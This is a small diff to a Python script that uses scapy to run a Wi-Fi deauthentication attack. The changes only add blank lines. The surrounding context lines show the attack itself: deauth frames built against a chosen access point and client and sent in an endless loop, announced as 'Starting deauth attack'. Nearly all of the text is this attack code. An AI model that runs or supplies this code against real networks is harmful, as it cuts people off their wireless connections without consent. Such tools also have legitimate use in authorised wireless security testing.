@@ -23,6 +23,7 @@ args = parser.parse_args()
 def main(interface, bssid, client):
     conf.iface = interface
     conf.verb = 0
+    
     print("[+] Starting deauth attack on {} targeting {}".format(bssid, client))
     packet = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
     while True:
@@ -44,4 +45,5 @@ if __name__ == "__main__":
         sys.exit("[!] Error happened while importing scapy")
     else:
         print("Done.")
+
     main(args.interface, args.bssid, args.client)
